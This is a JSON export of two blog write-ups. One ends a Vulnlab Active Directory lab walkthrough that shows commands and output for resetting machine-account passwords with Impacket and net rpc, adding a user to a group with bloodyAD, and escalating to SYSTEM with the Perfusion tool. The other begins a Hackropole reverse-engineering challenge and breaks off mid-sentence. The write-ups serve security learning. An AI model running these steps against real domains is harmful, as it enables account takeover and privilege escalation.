- 21:53:36 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# python rpcchangepwd.py retro2.vl/fs01\\$:fs01@$IP -newpass Test123!\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Password was changed successfully.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOnce that\u0026rsquo;s done, we can now modify the password of the ADMWS01 machine by abusing GenericWrite.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 22:05:29 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# net rpc password \u0026#39;ADMWS01$\u0026#39; Test123! -U retro2.vl/\u0026#39;fs01$\u0026#39;%Test123! -S $IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThen by abusing AddMember, we can add the ldapreader user to the SERVICES group.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 15, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 22:06:28 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# bloodyAD --host $IP -d retro2.vl -u \u0026#39;ADMWS01$\u0026#39; -p \u0026#39;Test123!\u0026#39; add groupMember \u0026#39;SERVICES\u0026#39; \u0026#39;ldapreader\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e+\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e ldapreader added to SERVICES\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNow we can connect via RDP to the domain controller BLN01.\u003c/p\u003e\n\u003ch2 id=\"privilege-escalation\"\u003ePrivilege Escalation\u003c/h2\u003e\n\u003cp\u003eOnce connected via RDP to the domain controller, we can look for privilege escalation. After some research, I found these two blog articles:\n\u003ca href=\"https://itm4n.github.io/windows-registry-rpceptmapper-eop/\"\u003ehttps://itm4n.github.io/windows-registry-rpceptmapper-eop/\u003c/a\u003e\n\u003ca href=\"https://itm4n.github.io/windows-registry-rpceptmapper-exploit/#in-the-previous-episode\"\u003ehttps://itm4n.github.io/windows-registry-rpceptmapper-exploit/#in-the-previous-episode\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWe will therefore use the Perfusion tool to become SYSTEM on the domain controller. This tool exploits a vulnerability on Windows 7 and Windows Server 2008 that allows adding a Performance key for the DNSCache and RpcEtMapper services. This key then allows loading a DLL that will execute a cmd in the WMI user context.\u003c/p\u003e\n\u003cp\u003eYou can compile the tool with Visual Studio 2019.\u003c/p\u003e\n\u003cp\u003eOnce that\u0026rsquo;s done, we create a small Python server to deliver the tool to the domain controller and then use it.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"retro2_perfusion.png\" alt=\"retro2_perfusion\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"retro2_perf_system.png\" alt=\"retro2_perf_system\"\u003e\u003c/p\u003e\n\u003cp\u003eBoom! Now we can get the flag!\u003c/p\u003e\n\u003cp\u003eThanks for reading!\u003c/p\u003e\n","date":"2025-10-16","dateFormatted":"2025.10.16","excerpt":"\u003cp\u003eIn this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e 10.10.90.89\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up \u003cspan style=\"color:#f92672\"\u003e( \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","featured":null,"mood":null,"permalink":"http://localhost:1313/posts/retro2/","readingTime":7,"slug":"index","subtitle":null,"summary":"\u003cp\u003eIn this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e 10.10.90.89\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0.025s latency\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: \u003cspan style=\"color:#ae81ff\"\u003e984\u003c/span\u003e filtered tcp ports \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eno-response\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT      STATE SERVICE            VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp    open  domain             Microsoft DNS 6.1.7601 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e1DB15F75\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eWindows Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 SP1\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp    open  kerberos-sec       Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-15 16:00:43Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp   open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp   open  ldap               Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro2.vl, Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp   open  microsoft-ds       Microsoft Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 - \u003cspan style=\"color:#ae81ff\"\u003e2012\u003c/span\u003e microsoft-ds \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eworkgroup: RETRO2\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp   open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp   open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro2.vl, Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp  open  ssl/ms-wbt-server?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49154/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49155/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49158/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOk, we are dealing with an Active Directory using a domain controller running Windows Server 2008 R2. I think there must already be CVEs for this version allowing us to quickly pwn the lab, but that\u0026rsquo;s probably not the intended path.\u003c/p\u003e","tags":["misc"],"title":"Vulnlab : Retro2 Easy","url":"http://localhost:1313/posts/retro2/","wordCount":1333},{"content":"\u003cp\u003eThis writeup is for the PORS challenge from Hackropole, a 2-star difficulty challenge.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eThe binary is in ELF format, x86_64 architecture and is stripped:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e~/Documents/hackropole/pors\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e19:39:09  file pors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epors: ELF 64-bit LSB executable, x86-64, version \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSYSV\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003esha1\u003cspan style=\"color:#f92672\"\u003e]=\u003c/span\u003ee03394fc3f442e87fd6114acbff6082426e4a652, \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, stripped\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eA first execution shows that it asks for input:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003el0key at dev in \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e~/Documents/hackropole/pors\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e19:39:12  ./pors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnter your input: test\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e-\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Wrong input, sorry...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThere\u0026rsquo;s also a file containing raw data alongside the executable (program.bin).\u003c/p\u003e\n\u003ch3 id=\"initial-analysis-with-ghidra\"\u003eInitial Analysis with Ghidra\u003c/h3\u003e\n\u003cp\u003eWe decompile the PORS program with Ghidra to find the steps that validate our input. Ghidra gives us this C pseudo-code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-C\" data-lang=\"C\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  uint buf_2;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  uint buf_one;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003ep3;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003ep2;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003ep1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  FILE \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003efdesc;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  fdesc \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efopen\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;program.bin\u0026#34;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (fdesc \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e (FILE \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x0\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[-] Failed to load program :/\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#75715e\"\u003e/* WARNING: Subroutine does not return */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003ebuf_one,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,fdesc);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  p1 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emmap\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e,(\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)((buf_one \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xfffff000\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x1000\u003c/span\u003e),\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0x22\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (p1 \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[-] init failed, sorry :/\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#75715e\"\u003e/* WARNING: Subroutine does not return */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,(\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)buf_one,fdesc);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003ebuf_2,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,fdesc);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  p2 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emmap\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e,(\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)((buf_2 \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0xfffff000\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x1000\u003c/span\u003e),\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0x22\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (p2 \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[-] init failed, sorry :/\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#75715e\"\u003e/* WARNING: Subroutine does not return */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efread\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0x42420000\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,(\u003cspan style=\"color:#66d9ef\"\u003elong\u003c/span\u003e)(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)buf_2,fdesc);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  p3 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emmap\u003c/span\u003e((\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0xcafe0000\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0x2000\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0x22\u003c/span\u003e,\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e (p3 \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003evoid\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e)\u003cspan style=\"color:#ae81ff\"\u003e0xcafe0000\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eputs\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[-] init failed, sorry :/\u0026#34;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#75715e\"\u003e/* WARNING: Subroutine does not return */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eexit\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003esyscall\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWithout going too far, we can already see there\u0026rsquo;s an issue. Indeed, we don\u0026rsquo;t see anywhere a part that retrieves and validates our input.\u003c/p\u003e\n\u003cp\u003eHowever, we can observe that the program.bin file is read and stored in memory regions of our process.\u003c/p\u003e\n\u003cp\u003eThe way it\u0026rsquo;s read should catch our attention. We can see that the data is divided into 3 specific memory regions (0x13370000, 0x42420000 and 0xcafe0000) and that mmap gives precise permissions to these memory regions. More specifically, the first mmap gives RWX permissions to the memory region starting at 0x13370000. Moreover, we can see that the file is parsed in a precise manner: we first read 4 bytes at the beginning of the file which are used in the size parameter of mmap, then we use these 4 bytes again to read a certain number of bytes into the allocated memory region. This means that each section in the program.bin file starts with information about its size.\u003c/p\u003e\n\u003cp\u003eAll of this indicates that the rest of the 